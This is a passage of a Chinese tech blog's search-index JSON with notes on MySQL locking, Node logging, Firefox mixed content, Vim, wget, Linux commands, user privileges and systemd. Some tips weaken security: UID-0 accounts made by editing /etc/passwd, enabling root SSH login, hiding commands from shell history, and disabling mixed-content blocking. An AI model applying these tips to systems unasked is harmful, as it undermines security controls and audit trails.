行锁，以及产生行锁的原因。","text":"这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。 锁的分类MySQL有三种锁的级别：页级、表级、行级。 表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。 行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。 页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般 因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。 行锁InnoDB实现了两种类型的行锁: 共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。 排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。 所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁 场景重现 首先创建一个 InnoDB类型的数据表，SQL 如下： 1234CREATE TABLE &#96;gap&#96; ( &#96;id&#96; int(11) DEFAULT NULL, KEY &#96;ind_gap_id&#96; (&#96;id&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 创建会话1，开启事务A并执行update 语句 12start transaction;update gap set id &#x3D; 30 where id &#x3D; 33; 创建会话2，开启事务B并执行另一个update 语句 12start transaction;update gap set id &#x3D; 22 where id &#x3D; 20; 在会话2中 插入20 &gt; id &lt; 39范围外的值时 可以执行成功,而当要插入 [20,39)范围内的值时 会遇到gap lock 。 用会话1 查看当前正在进行中的事务1SELECT * FROM information_schema.INNODB_TRX; 不会意外，能看到下面两条记录： 可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。 这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 next-key lock ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 [20,39)。 解决办法根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种： 改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。 如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。 参考链接 Mysql 死锁原因分析","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 查看死锁和解除死锁","slug":"mysql-view-deadlock-and-release-deadlock","date":"2020-07-19T08:07:48.000Z","updated":"2020-07-19T09:10:18.298Z","comments":true,"path":"mysql-view-deadlock-and-release-deadlock/","link":"","permalink":"https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/","excerpt":"前段时间遇到了一个Mysql 死锁相关的问题，整理一下。","text":"前段时间遇到了一个Mysql 死锁相关的问题，整理一下。 问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。 什么是死锁在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。 死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。 死锁的表现死锁的具体表现有两种： Mysql 增改语句无法正常生效 使用Mysql GUI 工具编辑字段的值时，会出现异常。 如何避免死锁阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则： 1.尽量避免并发的执行涉及到修改数据的语句。 2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。 3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。 查看死锁Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。 1. 查看正在进行中的事务1SELECT * FROM information_schema.INNODB_TRX 可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。 2. 查看正在锁的事务1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; 3. 查看等待锁的事务1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS; 4. 查询是否锁表1SHOW OPEN TABLES where In_use &gt; 0; 5. 查看最近死锁的日志1show engine innodb status 在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。 解除死锁如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。 查看当前正在进行中的进程。 1234show processlist&#x2F;&#x2F; 也可以使用SELECT * FROM information_schema.INNODB_TRX; 上面两个命令找出来的进程id 是同一个。 杀掉进程对应的进程 id 1kill id 验证（kill后再看是否还有锁） 1SHOW OPEN TABLES where In_use &gt; 0; 参考链接 Mysql 查看表和解锁表 Mysql 死锁是什么？","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"如何把 Console.log 的标准输出记录到文件","slug":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file","date":"2020-07-18T08:16:51.000Z","updated":"2020-07-18T08:47:27.103Z","comments":true,"path":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","link":"","permalink":"https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","excerpt":"最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把console.log的标准输出全部记录到文件中呢？","text":"最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把console.log的标准输出全部记录到文件中呢？ 我是没有选择那些大名鼎鼎的日志模块，如： winston - A logger for just about everything. log4js - A port of log4js to node.js 因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式： 12345678910111213141516var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);var log_stdout &#x3D; process.stdout;&#x2F;** * 重载console.log 函数 *&#x2F;console.log &#x3D; function() &#123; var res &#x3D; &quot;&quot;, len &#x3D; arguments.length; for(var i&#x3D;0; i&lt;len; i++)&#123; res +&#x3D; arguments[i]; &#125; log_file.write(util.format(res) + &#39;\\n&#39;); log_stdout.write(util.format(res) + &#39;\\n&#39;);&#125;; 参考链接 Node: log in a file instead of the console","categories":[{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"}]},{"title":"解决Firefox “已阻止载入混合活动内容”","slug":"resolve-firefox-has-blocked-loading-of-mixed-active-content","date":"2020-07-18T07:15:30.000Z","updated":"2020-07-18T07:21:10.821Z","comments":true,"path":"resolve-firefox-has-blocked-loading-of-mixed-active-content/","link":"","permalink":"https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/","excerpt":"最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的http与https之间的转换。 网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常：","text":"最近需要将项目迁移至一台新的服务器，其中涉及到多个站点的http与https之间的转换。 网站起初不能正常访问时，我没在意，以为是网络延迟（因为服务器放在国外），直到我打开控制台发现了如下异常： 这时我才意识到并不是网络延迟的问题，而是项目没有配置好。 什么是混合内容 当用户访问使用HTTPS的页面时，他们与web服务器之间的连接是使用SSL加密的，从而保护连接不受嗅探器和中间人攻击。如果HTTPS页面包括由普通明文HTTP连接加密的内容，那么连接只是被部分加密：非加密的内容可以被嗅探者入侵，并且可以被中间人攻击者修改，因此连接不再受到保护。当一个网页出现这种情况时，它被称为混合内容页面。 —— MDN 通俗一点解释就是：https 的页面中混合着http 的请求，而这种请求不会被浏览器正常接受的，也被称作为混合内容页面。 解决方案既然已经明白了为什么会产生这个问题，那么要解决起来也就非常简单了。 让Firefox暂时不阻止 打开新标签页，在地址栏输入 about:config，进入FireFox高级配置页面。 搜索security.mixed_content.block_active_content，将默认值true更改为false。 这种方式仅适用于本地调试。 避免在HTTPS页面中包含HTTP的内容更直接有效的方式应该是约定好项目中的协议，统一使用https或者http。 参考连接 什么是混合内容——MDN https访问遇到“已阻止载入混合内容”","categories":[{"name":"一些经验","slug":"一些经验","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"https","slug":"https","permalink":"https://www.0x2beace.com/tags/https/"}]},{"title":"Vim 安装 molokai 配色方案","slug":"vim-install-molokai-color-scheme","date":"2020-07-18T06:36:04.000Z","updated":"2020-07-18T06:38:53.741Z","comments":true,"path":"vim-install-molokai-color-scheme/","link":"","permalink":"https://www.0x2beace.com/vim-install-molokai-color-scheme/","excerpt":"像solarized、gruvbox、 molokai、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 molokai 。","text":"像solarized、gruvbox、 molokai、这些都是大名鼎鼎的VIM 配色方案，本文只介绍如何安装 molokai 。 按照顺序执行完上面的命令，即可使用最经典的配色方案了。 1234567cd ~mkdir .vim &amp;&amp; cd .vimgit clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.gitcp -rf molokai&#x2F;colors&#x2F; .&#x2F;colorsecho colorscheme molokai &gt;&gt; ~&#x2F;.vimrcecho set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrcecho set background&#x3D;dark &gt;&gt; ~&#x2F;.vimrc 实际效果：","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"sshd_config 常用配置项","slug":"sshd-config-common-configuration-items","date":"2020-07-17T15:17:09.000Z","updated":"2020-07-17T15:18:28.234Z","comments":true,"path":"sshd-config-common-configuration-items/","link":"","permalink":"https://www.0x2beace.com/sshd-config-common-configuration-items/","excerpt":"这篇笔记用来收录那些常用的sshd_config配置项。","text":"这篇笔记用来收录那些常用的sshd_config配置项。 保持链接保持客户端与服务端之间的连接保持活动状态似乎是最常见策略。 ServerAliveInterval：客户端在向服务器发送空数据包之前（等待连接保持活动状态）将等待的秒数。 ClientAliveInterval：服务器在向客户端发送空数据包之前（等待连接保持活动状态）将等待的秒数。 设置为0（默认值）将禁用这些功能，因此如果空闲时间太长，连接可能会断开。 12345Host myhostshortcut HostName myhost.com User barthelemy ServerAliveInterval 60 ServerAliveCountMax 10 这么设置的作用是：客户端将等待空闲60秒钟（ServerAliveInterval时间），然后向服务器发送 no-op null数据包，并期待响应。 如果没有响应，则它将继续尝试上述过程直到10次（ServerAliveCountMax 次数 10 * 60 = 600秒）。如果服务器仍然没有响应，则客户端将断开ssh连接。 参考链接 如何让ssh客户端与服务端保持连接 sshd_config 参考手册","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"}]},{"title":"Wget 使用技巧","slug":"wget-tips","date":"2020-07-16T15:30:39.000Z","updated":"2020-07-16T15:31:23.790Z","comments":true,"path":"wget-tips/","link":"","permalink":"https://www.0x2beace.com/wget-tips/","excerpt":"wget 是一个命令行的下载工具，对于经常使用Linux的用户来说，真是再熟悉不过了。下面总结了一些实用的wget使用技巧，可能会让你更加高效地使用 wget。","text":"wget 是一个命令行的下载工具，对于经常使用Linux的用户来说，真是再熟悉不过了。下面总结了一些实用的wget使用技巧，可能会让你更加高效地使用 wget。 重命名最常见的使用方式： 1$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt wget默认会以最后一个符合 / 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。 如果希望对这个下载的文件进行重命名，我们可以使用参数 -O 来指定一个文件名： 1$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt 后台下载当需要下载比较大的文件时，使用参数 -b 可以隐藏在后台进行下载： 1$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg 然后可以使用以下命令查看当前的进度： 1$ tail -f wget-log 下载目录这条命令可以下载 http://example.com 网站上 packages 目录中的所有文件。 参数说明： -r：下载目录 -np：不遍历父目录 -nd：不在本机重新创建目录结构 1$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F; 与上一条命令相似，但多加了一个 --accept=iso 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。 1$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F; 批量下载此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。 1$ wget -i filename.txt 断点续传通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 -c 参数，作为断点续传。 好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。 1$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso 其他该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项 1$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F; 参考链接 wget 使用技巧","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"一些实用的 Linux 命令","slug":"some-practical-linux-commands","date":"2020-07-16T15:26:13.000Z","updated":"2020-08-15T01:05:05.992Z","comments":true,"path":"some-practical-linux-commands/","link":"","permalink":"https://www.0x2beace.com/some-practical-linux-commands/","excerpt":"这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。","text":"这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。 sudo!!有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。 还真有，!!命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。 1$ sudo!! nlnl 命令类似cat命令，都是查看文件内容，但不同之处在于：nl命令会在文本内容的每一行前面，添加行号。 123456$ cat test.txtboomac$ nl test.txt1. boo2. mac tree以树状的形式返回当前目录的文件夹结构，这个命令很好用。 12345$ tree .└── test.txt0 directories, 1 file pstree和tree类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。 1234$ pstree | grep php|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off; | \\--- 01410 boo nginx: worker process | | \\--- 73098 boo grep --color&#x3D;auto nginx &lt;空格&gt; 命令这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到history中，那么有没有一个命令可以骗过history，而不被记入呢？答案是有的。 在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。 123456$ hisotry8874 pstree | grep nginx$ date2020年 5月18日 星期一 21时09分03秒 CST$ history8874 pstree | grep nginx 一些其他命令查看系统信息 1$ uname -a 查看当前日期 1$ date 立即关机 1$ shutdown -h now 重新启动 1$ reboot 输出文件类型信息 12$ file test.txttest.txt: ASCII text 在终端中进行简单的算数运算 12$ expr 1 + 34 重命名文件 123$ mv fileA.txt fileB.txt$ lsfileB.txt nohup 是一个 POSIX 命令，用于忽略 SIGHUP 。 SIGHUP信号是終端注销时所发送至程序的一个信号。 1nohub php script.php type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。 123type -a phpphp is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpphp is &#x2F;usr&#x2F;bin&#x2F;php 命令类型： alias：别名。 keyword：关键字，Shell保留字。 function：函数，Shell函数。 builtin：内建命令，Shell内建命令。 file：文件，磁盘文件，外部命令。 unfound：没有找到。 查找进程 1ps -aux | grep php 注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用-aux参数，但可能其他系统不能加破折号。参考链接：Linux ps command help and example 杀死进程 根据 pid（会杀死指定pid 的进程） 1kill -9 [pid] 根据进程名称（会杀死一组同名进程） 1killall php dig这个命令特别实用，可以用来查看域名解析情况。 123456789101112131415dig 0x2BeAce.com +nostats +nocomments +nocmd; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd;; global options: +cmd;0x2BeAce.com. IN A0x2BeAce.com. 3581 IN A 185.199.108.1530x2BeAce.com. 3581 IN A 185.199.110.1530x2BeAce.com. 3581 IN A 185.199.111.1530x2BeAce.com. 3581 IN A 185.199.109.1530x2BeAce.com. 3581 IN NS ns12.domaincontrol.com.0x2BeAce.com. 3581 IN NS ns11.domaincontrol.com.ns12.domaincontrol.com. 59833 IN A 173.201.73.6ns11.domaincontrol.com. 92984 IN A 97.74.105.6ns12.domaincontrol.com. 146699 IN AAAA 2603:5:2290::6ns11.domaincontrol.com. 92042 IN AAAA 2603:5:2190::6 参考链接 鲜为人知而又实用的 Linux 命令","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux 添加用户以及权限分配","slug":"linux-add-users-and-assign-permissions","date":"2020-07-15T15:19:14.000Z","updated":"2020-07-16T15:29:23.772Z","comments":true,"path":"linux-add-users-and-assign-permissions/","link":"","permalink":"https://www.0x2beace.com/linux-add-users-and-assign-permissions/","excerpt":"写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。 另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。","text":"写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。 另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。 添加用户在 Linux 上，添加用户有两种方式：useradd和adduser，其区别就是： useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。 adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。 adduser相比 useradd，adduser的使用要简单很多。 使用adduser 添加一个用户： 1$ adduser boo 然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 /home 目录下创建一个与用户同名的目录。 用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。 useradduseradd 命令有大量的参数供我们进行个性设置，常用参数如下： -d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权\u001c -g&lt;群组&gt;：指定用户所属的群组； -G&lt;群组&gt;：指定用户所属的附加群组； -m：在 /home 目录下自动建立用户的登入目录； -r：建立系统帐号； -s：指定用户登入后所使用的shell； -u：指定用户的 id 使用 useradd 创建用户的一般步骤如下： 1234$ useradd -m boo -s &#x2F;bin&#x2F;bash$ passwd boo$ ls &#x2F;home&#x2F;boo 其中要注意的有： useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。 useradd 这个命令创建的是普通账号，并不能用来登录系统。加上参数-r，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。 当使用参数-m的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用-m的话，那么就默认是使用-M参数，不创建主文件夹，即使你使用了-d这个参数。所以如果想要自己选择主文件夹，需要同时加上-m和-d参数。 误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。 权限分配提权无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令： 1$ sudo apt-get install vim 不出意外，你肯定会得到这样一个错误： 12[sudo] password for boo:boo is not in the sudoers file. This incident will be reported. 这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？ 使用如下命令： 1234567$ sudo visudo# Members of the admin group may gain root privileges%admin ALL&#x3D;(ALL) ALL# 找到该注释，在其下增加一行 %yourusername ALL&#x3D;(ALL) ALL 然后保存退出，就会发现可以使用 sudo 提权了。 赋予 root 权限这里有三种方式，先来看看最简单的方式： 方式一： 1234$ sudo vim &#x2F;etc&#x2F;passwd# 将用户id 改为 0testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh 需要注意的是： 该方法适用于普通用户以及管理员用户 使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。 方式二：（这里以ubuntu 系统为例） 1234567$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# Allow members of group sudo to execute any command%sudo ALL&#x3D;(ALL:ALL) ALL# 在其后面增加一行%wheel ALL&#x3D;(ALL:ALL) ALL 然后修改该用户，使其属于 root 组（wheel）： 1$ usermod -g root boo 修改完成之后，使用boo 用户登入，执行命令：su -，输入 root 账户的密码，即可获得root 权限。 方式三：（这里以ubuntu 为例） 12345$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# User privilege specificationroot ALL&#x3D;(ALL:ALL) ALLboo ALL&#x3D;(ALL:ALL) ALL 修改完成之后，使用boo 用户登入，执行命令：su -，输入 root 账户的密码，即可获得root 权限。 方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。 另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。 事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 Permission denied, please try again.这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。 扩展补充在Ubuntu中如何修改 root 密码默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如su -之类的命令成为超级用户。 但可以借助其他方式，使用passwd命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。 使用以下命令成为 root用户： 12$ sudo -i$ passwd root 如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改 1$ passwd root 在Ubuntu中如何远程 root 登入在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作： 12345678$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# PermitRootLogin prohibit-password# 修改为：# PermitRootLogin yes# 重启sshd 服务$ sudo systemctl restart sshd 参考链接 adduser 和 useradd 的区别 Ubuntu 如何进入单用户模式 ssh-如何远程以root 登入 如何在Ubuntu Linux 中更改 root 密码 如何使用su / sudo成为Ubuntu Linux的超级用户？ Ubuntu Linux root 用户默认密码","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux init、service、systemctl 这三者之间的区别","slug":"the-difference-between-linux-init-service-systemctl","date":"2020-07-14T15:38:00.000Z","updated":"2020-07-14T15:39:41.990Z","comments":true,"path":"the-difference-between-linux-init-service-systemctl/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/","excerpt":"在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是init、service、systemctl。 至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。","text":"在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是init、service、systemctl。 至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。 init历史上，Linux 的启动一直采用init 进程。 在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。 Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。 因为init 的参数全在/etc/init.d目录下，所以使用 init 启动一个服务，应该这样做： 1$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start service通过查看man 手册页可以得知，service是一个运行System V init的脚本命令。 那么什么是 System V init 呢？ 也就是/etc/init.d 目录下的参数。 所以分析可知service 是去/etc/init.d目录下执行相关程序，服务配置文件的存放目录就是/etc/init.d. 使用 service 启动一个服务 1$ service nginx start 可以理解成 service 就是init.d 的一种实现方式。所以这两者启动方式（或者是停止、重启）并没有什么区别。 123$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start&#x2F;&#x2F; 等价于$ service nginx start 但是这两种方式均有如下缺点： 启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。 systemdSystemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 System V init固有的缺点，提高系统的启动速度。 根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。 使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。 Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。 查看Systemd 的版本信息 1$ systemctl --version 系统管理Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。 systemctlsystemctl是 Systemd 的主命令，用于管理系统。 12345678&#x2F;&#x2F; 重启系统$ sudo systemctl reboot&#x2F;&#x2F; 启动进入救援状态（单用户状态）$ sudo systemctl rescue&#x2F;&#x2F; 管理服务$ sudo systemctl start nginx hostnamectlhostnamectl命令用于查看当前主机的信息。 12345&#x2F;&#x2F; 显示当前主机信息$ hostnamectl&#x2F;&#x2F; 设置主机名$ sudo hostnamectl set-hostname BoodeUbuntu localectllocalectl命令用于查看本地化设置。 123456&#x2F;&#x2F; 查看本地化设置$ localectl&#x2F;&#x2F; 设置本地化参数。$ sudo localectl set-locale LANG&#x3D;en_GB.utf8$ sudo localectl set-keymap en_GB timedatectltimedatectl命令用于查看当前时区设置。 12345678910&#x2F;&#x2F; 查看当前时区设置$ timedatectl&#x2F;&#x2F; 显示所有可用的时区$ timedatectl list-timezones &#x2F;&#x2F; 设置当前时区$ sudo timedatectl set-timezone America&#x2F;New_York$ sudo timedatectl set-time YYYY-MM-DD$ sudo timedatectl set-time HH:MM:SS 总结一下，init 是最初的进程管理方式，service 是init 的另一种实现，而 systemd 则是一种取代 initd 的解决方案，其中 systemctl 是 systemd 的主命令，用于管理系统以及服务。 参考链接 Linux Init - 维基百科 Systemd 入门教程 - 阮一峰的网络日志 init、service、systemctl 的区别 Linux 守护进程的启动方式","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"了解 Linux的管道符、重定向、环境变量","slug":"understand-linux-pipe-symbols-redirects-environment-variables","date":"2020-07-13T15:48:12.000Z","updated":"2020-07-14T15:49:18.916Z","comments":true,"path":"understand-linux-pipe-symbols-redirects-environment-variables/","link":"","permalink":"https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/","excerpt":"这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。","text":"这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。 输入输出重定向在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别： 标准输出信息：包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。 错误输出信息：Bash终端显示的报错提示信息123456[max@localhost 桌面]$ lstestdir test.txt[max@localhost 桌面]$ cat test.txtHello Linux! # 